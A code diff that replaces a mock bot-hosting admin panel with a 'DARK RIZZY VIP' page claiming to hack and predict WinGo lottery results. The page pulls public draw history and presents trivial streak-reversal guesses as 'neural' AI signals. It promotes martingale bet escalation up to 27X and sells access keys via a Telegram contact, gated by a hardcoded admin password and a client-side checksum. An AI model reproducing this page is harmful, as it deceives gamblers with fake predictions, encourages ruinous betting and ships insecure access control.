-        showToast("🔓 Admin Panel Unlocked! Welcome Owner.", "success");
-        refreshUI();
-      } else {
-        if (errMsg) errMsg.classList.remove("hidden");
-        if (formBox) {
-          formBox.classList.remove("animate-shake");
-          void formBox.offsetWidth; // trigger reflow
-          formBox.classList.add("animate-shake");
-        }
-        showToast("Invalid Admin Key! Access Denied.", "danger");
-      }
-    }
-
-    function lockAdminPanel() {
-      state.adminAuthenticated = false;
-      addAudit("admin_logout", "panel_locked=true");
-      showToast("🔒 Admin Panel Locked.", "info");
-      refreshUI();
-    }
-
-    function createAdminCoupon() {
-      const codeEl = document.getElementById("adminCouponCode");
-      const amtEl = document.getElementById("adminCouponAmt");
-      const code = (codeEl.value || "").trim().toUpperCase();
-      const amt = parseInt(amtEl.value || "0", 10);
-      if (!code || amt <= 0) {
-        showToast("Enter valid coupon code and amount", "warn");
-        return;
-      }
-      state.coupons[code] = amt;
-      codeEl.value = "";
-      addAudit("coupon_add", `code=${code} credit=${amt}৳`);
-      showToast(`Created coupon ${code} (+${amt} ৳)`, "success");
-    }
-
-    function sendAdminBroadcast() {
-      const input = document.getElementById("adminBroadcastInput");
-      const msg = (input.value || "").trim();
-      if (!msg) {
-        showToast("Enter a broadcast message first", "warn");
-        return;
-      }
-      input.value = "";
-      addAudit("broadcast", `msg="${msg.slice(0, 40)}" sent=all`);
-      showToast(`📢 Broadcast delivered to all active users: "${msg}"`, "success");
-    }
-
-    function renderAdminPanel() {
-      const box = document.getElementById("adminPendingContainer");
-      document.getElementById("pendingCountLabel").textContent = `${state.pendingUploads.length} waiting`;
-
-      if (!state.pendingUploads.length) {
-        box.innerHTML = `<div class="p-6 rounded-xl bg-slate-950 border border-slate-800 text-center text-xs text-slate-500">Inbox is empty — no uploads waiting for approval.</div>`;
-      } else {
-        box.innerHTML = state.pendingUploads.map(item => `
-          <div class="p-3.5 rounded-xl bg-slate-950 border border-slate-800 flex flex-wrap items-center justify-between gap-3">
-            <div>
-              <div class="flex items-center gap-2">
-                <span class="font-mono font-bold text-sm text-white">${item.name}</span>
-                <span class="text-[10px] font-mono px-2 py-0.5 rounded ${item.verdict === 'SAFE' ? 'bg-emerald-500/15 text-emerald-300' : 'bg-amber-500/15 text-amber-300'}">
-                  ${item.verdict} (${item.risk}/100)
+                <span style="font-size: 20px; color: var(--neon-cyan);">
+                    PREDICTION
                 </span>
-              </div>
-              <p class="text-xs text-slate-400 mt-0.5">From: ${item.user} • File: <code>${item.file}</code> (${item.size})</p>
             </div>
-            <div class="flex gap-2">
-              <button onclick="adminDecideUpload('${item.id}', true)" class="px-3 py-1.5 rounded-lg bg-emerald-600/20 hover:bg-emerald-600/30 text-emerald-300 border border-emerald-500/30 text-xs font-semibold">
-                <i class="fa-solid fa-check mr-1"></i> Approve
-              </button>
-              <button onclick="adminDecideUpload('${item.id}', false)" class="px-3 py-1.5 rounded-lg bg-rose-600/20 hover:bg-rose-600/30 text-rose-300 border border-rose-500/30 text-xs font-semibold">
-                <i class="fa-solid fa-xmark mr-1"></i> Reject
-              </button>
+
+            <!-- LOGIN SECTION -->
+            <div id="authSection" class="glass-card" style="text-align: center;">
+                <div class="strat-mode">🔐 VIP ACCESS LOGIN</div>
+                <p style="font-size: 11px; color: var(--neon-cyan); margin-bottom: 15px;">
+                    ENTER VIP KEY OR ADMIN KEY
+                </p>
+                <input type="text" id="accessKeyInput" class="cyber-input" placeholder="DARK-RIZZY-XXX">
+                <button class="btn-copy" style="margin-top: 5px;" onclick="verifyAccess()">⚡ UNLOCK ENGINE ⚡</button>
+                <p id="loginMsg" style="font-size: 11px; color: #ff10f0; margin-top: 10px; font-weight: bold;"></p>
+                <div style="margin-top: 12px; font-size: 11px; color: var(--cyber-lime);">
+                    ⚡ TG:- @RANGDARBHAI01 ⚡
+                </div>
             </div>
-          </div>
-        `).join("");
-      }
 
-      const auditEl = document.getElementById("adminAuditList");
-      auditEl.innerHTML = state.auditLogs.map(l => `<div class="py-1 border-b border-slate-900">${l}</div>`).join("");
+            <!-- ADMIN PANEL SECTION -->
+            <div id="adminPanel" class="glass-card hidden" style="text-align: center;">
+                <div class="strat-mode" style="color: var(--gold); border-color: var(--gold);">👑 ADMIN PANEL - KEY GENERATOR</div>
+                <div id="generatedKeyDisplay" class="key-box">DARK-RIZZY-XXX</div>
+                <div style="display: flex; gap: 10px;">
+                    <button class="btn-copy" style="margin-top: 5px;" onclick="generateNewKey()">🎲 GENERATE KEY</button>
+                    <button class="btn-copy" style="margin-top: 5px; background: linear-gradient(90deg, #ff8c00, #ffd700); color: #000;" onclick="copyGenKey()">📋 COPY KEY</button>
+                </div>
+            </div>
+
+            <!-- MAIN HACK SECTION -->
+            <div id="hackSection" class="hidden">
+
+                <div class="status-info">
+                    <span>📡 SERVER: CYBERLINK</span>
+                    <span id="pingVal">PING: 12MS</span>
+                </div>
+
+                <div class="glass-card" style="text-align: center;">
+
+                    <div id="stratDisplay" class="strat-mode">
+                        MODE: DARK RIZZY X VIP MODE
+                    </div>
+
+                    <div id="timer" class="timer-display">
+                        00:60
+                    </div>
+
+                    <div id="pID" style="margin-bottom: 6px;">
+                        PERIOD: ---
+                    </div>
+
+                    <div id="pRes" class="pred-val">
+                        INIT
+                    </div>
+
+                    <div id="mLevel" class="lvl-badge">
+                        MARTINGALE: LEVEL 2 (1X)
+                    </div>
+
+                    <div style="font-size: 11px; color: var(--cyber-lime); margin-bottom: 5px;">
+                        ✦ OPPOSITE NUMBERS ✦
+                    </div>
+
+                    <div class="num-row" id="numRow">
+                        <div class="num-circle">?</div>
+                        <div class="num-circle">?</div>
+                    </div>
+
+                    <button id="copyPredBtn" class="btn-copy" onclick="copyPrediction()">
+                        📋 COPY PREDICTION
+                    </button>
+
+                </div>
+
+                <div class="glass-card">
+
+                    <div style="
+                        font-size: 12px;
+                        color: var(--neon-cyan);
+                        margin-bottom: 12px;
+                        display: flex;
+                        justify-content: space-between;
+                        align-items: center;
+                    ">
+                        <span>📊 NEURAL HISTORY (MAX 100)</span>
+
+                        <button
+                            class="btn-clear"
+                            style="width: auto; padding: 8px 16px; margin-top: 0;"
+                            onclick="clearHistory()"
+                        >
+                            🗑️ CLEAR LOG
+                        </button>
+                    </div>
+
+                    <div class="history-wrap">
+
+                        <table>
+
+                            <thead>
+                                <tr>
+                                    <th>PERIOD</th>
+                                    <th>PRED</th>
+                                    <th>RESULT</th>
+                                    <th>STATUS</th>
+                                </tr>
+                            </thead>
+
+                            <tbody id="logs"></tbody>
+
+                        </table>
+
+                    </div>
+
+                </div>
+
+            </div>
+
+        </div>
+
+    </div>
+
+<script>
+
+    const API =
+        "https://draw.ar-lottery01.com/WinGo/WinGo_30S/GetHistoryIssuePage.json";
+
+    const ADMIN_KEY = "ASHIF@1234";
+
+    let lastP = null;
+    let nextP = null;
+    let currentPeriodFull = "---";
+    let targetNums = [];
+    let currentLevel = 1;
+
+    let historyLogs = [];
+
+    const sWin = new Audio(
+        'https://assets.mixkit.co/active_storage/sfx/2019/2019-preview.mp3'
+    );
+
+    const sLoss = new Audio(
+        'https://assets.mixkit.co/active_storage/sfx/951/951-preview.mp3'
+    );
+
+    const sDing = new Audio(
+        'https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3'
+    );
+
+
+    window.onload = () => {
+
+        setTimeout(() => {
+
+            document.getElementById('introScreen').style.opacity = '0';
+
+            setTimeout(() => {
+
+                document
+                    .getElementById('introScreen')
+                    .classList
+                    .add('hidden');
+
+                document
+                    .getElementById('mainWrapper')
+                    .classList
+                    .remove('hidden');
+
+            }, 800);
+
+        }, 3000);
+
+    };
+
+    // --- KEY & ADMIN SYSTEM (GITHUB STATIC COMPATIBLE) ---
+    function isValidGeneratedKey(key) {
+        const regex = /^DARK-RIZZY-([A-Z0-9]{3})$/;
+        const match = key.match(regex);
+        if (!match) return false;
+        
+        const code = match[1];
+        const c1 = code.charCodeAt(0);
+        const c2 = code.charCodeAt(1);
+        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+        const expectedC3 = chars[(c1 + c2 + 7) % chars.length];
+        
+        const savedKeys = JSON.parse(localStorage.getItem('dark_rizzy_keys') || '[]');
+        return code[2] === expectedC3 || savedKeys.includes(key);
     }
 
-    function adminDecideUpload(id, approve) {
-      const idx = state.pendingUploads.findIndex(x => x.id === id);
-      if (idx === -1) return;
-      const item = state.pendingUploads.splice(idx, 1)[0];
-      if (approve) {
-        state.bots.push({
-          id: item.id,
-          name: item.name,
-          kind: "python",
-          entry: "bot.py",
-          status: "running",
-          pid: Math.floor(22000 + Math.random() * 5000),
-          cpu: 1.9,
-          memMb: 62.0,
-          sizeKb: 148,
-          uptimeSec: 1,
-          tunnelUrl: "",
-          tunnelPort: 8000,
-          env: {},
-          logs: [`════════════════ APPROVED & STARTED BY ADMIN ════════════════`]
+    function generateNewKey() {
+        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+        const ch1 = chars[Math.floor(Math.random() * chars.length)];
+        const ch2 = chars[Math.floor(Math.random() * chars.length)];
+        const ch3 = chars[(ch1.charCodeAt(0) + ch2.charCodeAt(0) + 7) % chars.length];
+        
+        const newKey = `DARK-RIZZY-${ch1}${ch2}${ch3}`;
+        document.getElementById('generatedKeyDisplay').innerText = newKey;
+
+        const savedKeys = JSON.parse(localStorage.getItem('dark_rizzy_keys') || '[]');
+        savedKeys.push(newKey);
+        localStorage.setItem('dark_rizzy_keys', JSON.stringify(savedKeys));
+    }
+
+    function copyGenKey() {
+        const keyText = document.getElementById('generatedKeyDisplay').innerText;
+        if (keyText === "DARK-RIZZY-XXX") {
+            generateNewKey();
+        }
+        const finalKey = document.getElementById('generatedKeyDisplay').innerText;
+        navigator.clipboard.writeText(finalKey);
+        alert("KEY COPIED: " + finalKey);
+    }
+
+    function verifyAccess() {
+        const val = document.getElementById('accessKeyInput').value.trim();
+        const msg = document.getElementById('loginMsg');
+
+        if (val === ADMIN_KEY) {
+            document.getElementById('authSection').classList.add('hidden');
+            document.getElementById('adminPanel').classList.remove('hidden');
+            document.getElementById('hackSection').classList.remove('hidden');
+            generateNewKey();
+            startApp();
+        } else if (isValidGeneratedKey(val.toUpperCase())) {
+            document.getElementById('authSection').classList.add('hidden');
+            document.getElementById('hackSection').classList.remove('hidden');
+            startApp();
+        } else {
+            msg.innerText = "❌ INVALID KEY! CONTACT @RANGDARBHAI01";
+        }
+    }
+
+    // --- COPY PREDICTION FUNCTION ---
+    function copyPrediction() {
+        if (!nextP || targetNums.length === 0) return;
+
+        const text = `🍥 DARK X RIZZY 𝐀𝐈 𝐕𝐈𝐏 𝐒𝐈𝐆𝐍𝐀𝐋 \n⏱️ PERIOD: ${currentPeriodFull}\n🔥 PREDICTION: ${nextP}\n🔢 NUMBERS: ${targetNums[0]}, ${targetNums[1]}\n👑 BEST OF LUCK`;
+
+        navigator.clipboard.writeText(text).then(() => {
+            const btn = document.getElementById('copyPredBtn');
+            btn.innerText = "✅ COPIED TO CLIPBOARD!";
+            setTimeout(() => {
+                btn.innerText = "📋 COPY PREDICTION";
+            }, 1500);
         });
-        addAudit("approve_bot", `bot=${item.name}`);
-        showToast(`Approved & started ${item.name}`, "success");
-      } else {
-        addAudit("reject_bot", `bot=${item.name}`);
-        showToast(`Rejected & wiped ${item.name}`, "danger");
-      }
-      refreshUI();
     }
 
-    function toggleApprovalGate() {
-      state.approvalRequired = !state.approvalRequired;
-      const btn = document.getElementById("adminApprovalBtn");
-      btn.innerHTML = `<i class="fa-solid fa-check-double mr-1"></i> Approval Mode: ${state.approvalRequired ? 'ON' : 'OFF'}`;
-      addAudit("approval_toggle", `now=${state.approvalRequired}`);
-      showToast(`Approval Mode turned ${state.approvalRequired ? 'ON' : 'OFF'}`, "info");
+
+    function startApp() {
+
+        syncEngine();
+
+        setInterval(
+            syncEngine,
+            2000
+        );
+
+        startClock();
     }
 
-    function toggleMaintenanceMode() {
-      state.maintenanceMode = !state.maintenanceMode;
-      const btn = document.getElementById("adminMaintBtn");
-      btn.innerHTML = `<i class="fa-solid fa-screwdriver-wrench mr-1"></i> Maintenance: ${state.maintenanceMode ? 'ON' : 'OFF'}`;
-      addAudit("maintenance_toggle", `now=${state.maintenanceMode}`);
-      showToast(`Maintenance mode ${state.maintenanceMode ? 'ENABLED' : 'DISABLED'}`, "warn");
+
+    function clearHistory() {
+
+        historyLogs = [];
+
+        document
+            .getElementById('logs')
+            .innerHTML = '';
     }
 
-    function triggerGitHubBackup() {
-      document.getElementById("ghLastBackupTime").textContent = "Uploading tarball...";
-      setTimeout(() => {
-        document.getElementById("ghLastBackupTime").textContent = new Date().toISOString().slice(11, 19) + " UTC (2.4 MB)";
-        addAudit("gh_backup_now", "backups/latest.tar.gz ok");
-        showToast("Synced encrypted storage & user_data.json to GitHub!", "success");
-      }, 800);
+
+    function startClock() {
+
+        setInterval(() => {
+
+            const rem =
+                60 - new Date().getSeconds();
+
+            document
+                .getElementById('timer')
+                .innerText =
+                `00:${rem < 10 ? '0' + rem : rem}`;
+
+            if (rem === 5)
+                sDing
+                    .play()
+                    .catch(() => {});
+
+            document
+                .getElementById('timer')
+                .style
+                .color =
+                rem <= 5
+                    ? "#ff10f0"
+                    : "#ccff00";
+
+        }, 1000);
     }
 
-    function adminMassAction(kind) {
-      if (kind === "stop") {
-        state.bots.forEach(b => { b.status = "stopped"; b.cpu = 0; b.memMb = 0; b.pid = null; });
-        addAudit("stop_all_bots", `count=${state.bots.length}`);
-        showToast("Stopped all running bots", "danger");
-      } else {
-        state.bots.forEach(b => {
-          b.status = "running";
-          b.pid = Math.floor(20000 + Math.random() * 9000);
-          b.cpu = +(2 + Math.random() * 3).toFixed(1);
-          b.memMb = +(60 + Math.random() * 50).toFixed(1);
-        });
-        addAudit("restart_all_bots", `count=${state.bots.length}`);
-        showToast("Restarted all bots cleanly", "success");
-      }
-      refreshUI();
+
+    async function syncEngine() {
+
+        if (
+            document
+                .getElementById('hackSection')
+                .classList
+                .contains('hidden')
+        )
+            return;
+
+        try {
+
+            const r =
+                await fetch(
+                    API + '?t=' + Date.now()
+                );
+
+            const d =
+                await r.json();
+
+            const top =
+                d.data.list[0];
+
+            processHybrid(
+                top.issueNumber,
+                parseInt(top.number),
+                d.data.list
+            );
+
+        } catch (e) {}
     }
 
-    // Initialize on load
-    window.addEventListener("DOMContentLoaded", () => {
-      loadScannerPreset("clean");
-      switchTab("dashboard");
-    });
-  </script>
+
+    function processHybrid(
+        p,
+        num,
+        list
+    ) {
+
+        const actual =
+            num >= 5
+                ? "BIG"
+                : "SMALL";
+
+        if (lastP !== p) {
+
+            if (nextP && lastP) {
+
+                const isNumberWin = targetNums.includes(num);
+                const isSizeWin = (nextP === actual);
+                const win = isSizeWin || isNumberWin;
+
+                if (win) {
+
+                    sWin
+                        .play()
+                        .catch(() => {});
+
+                    currentLevel = 1;
+
+                } else {
+
+                    sLoss
+                        .play()
+                        .catch(() => {});
+
+                    currentLevel++;
+
+                    if (currentLevel > 4)
+                        currentLevel = 1;
+                }
+
+                const multiplier =
+                    currentLevel === 1
+                        ? "1X"
+                        : currentLevel === 2
+                        ? "3X"
+                        : currentLevel === 3
+                        ? "9X"
+                        : "27X";
+
+                document
+                    .getElementById('mLevel')
+                    .innerText =
+                    `MARTINGALE: LEVEL ${currentLevel} (${multiplier})`;
+
+                let statusText = 'LOSS';
+                let statusClass = 'loss';
+
+                if (isNumberWin) {
+                    statusText = 'JACKPORT';
+                    statusClass = 'jackpot';
+                } else if (isSizeWin) {
+                    statusText = 'WIN';
+                    statusClass = 'win';
+                }
+
+                const entry = {
+
+                    period: p.slice(-3),
+
+                    pred: nextP,
+
+                    result:
+                        `${actual}(${num})`,
+
+                    status: statusText,
+
+                    winClass: statusClass
+                };
+
+                historyLogs.unshift(entry);
+
+                if (historyLogs.length > 100)
+                    historyLogs =
+                        historyLogs.slice(
+                            0,
+                            100
+                        );
+
+                const row =
+                    `<tr>
+                        <td>${entry.period}</td>
+                        <td>${entry.pred}</td>
+                        <td>${entry.result}</td>
+                        <td class="${entry.winClass}">
+                            ${entry.status}
+                        </td>
+                    </tr>`;
+
+                document
+                    .getElementById('logs')
+                    .innerHTML =
+                    row +
+                    document
+                        .getElementById('logs')
+                        .innerHTML;
+            }
+
+            lastP = p;
+
+            const last5 =
+                list
+                    .slice(0, 5)
+                    .map(
+                        x =>
+                            parseInt(x.number) >= 5
+                                ? "BIG"
+                                : "SMALL"
+                    );
+
+            const lastNums =
+                list
+                    .slice(0, 5)
+                    .map(
+                        x =>
+                            parseInt(x.number)
+                    );
+
+            const stratDisp =
+                document
+                    .getElementById(
+                        'stratDisplay'
+                    );
+
+            if (
+                last5[0] === last5[1] &&
+                last5[1] === last5[2]
+            ) {
+
+                nextP = last5[0];
+
+                stratDisp.innerText =
+                    "MODE: DRAGON PULSE";
+
+            } else {
+
+                nextP =
+                    last5[0] === "BIG"
+                        ? "SMALL"
+                        : "BIG";
+
+                stratDisp.innerText =
+                    "MODE: NEURAL REVERSE";
+            }
+
+            const sum =
+                lastNums.reduce(
+                    (a, b) => a + b,
+                    0
+                );
+
+            if (nextP === "BIG") {
+
+                targetNums =
+                    sum > 20
+                        ? [0, 2]
+                        : [1, 3];
+
+            } else {
+
+                targetNums =
+                    sum < 25
+                        ? [7, 9]
+                        : [6, 8];
+            }
+
+            currentPeriodFull = (BigInt(p) + 1n).toString();
+
+            document
+                .getElementById('pID')
+                .innerText =
+                "PERIOD: " + currentPeriodFull;
+
+            document
+                .getElementById('pRes')
+                .innerText =
+                nextP;
+
+            document
+                .getElementById('pRes')
+                .style
+                .color =
+                nextP === "BIG"
+                    ? "#00ffff"
+                    : "#ccff00";
+
+            document
+                .getElementById('numRow')
+                .innerHTML =
+                `<div class="num-circle">
+                    ${targetNums[0]}
+                </div>
+                <div class="num-circle">
+                    ${targetNums[1]}
+                </div>`;
+        }
+    }
+
+</script>
+
 </body>
 </html>
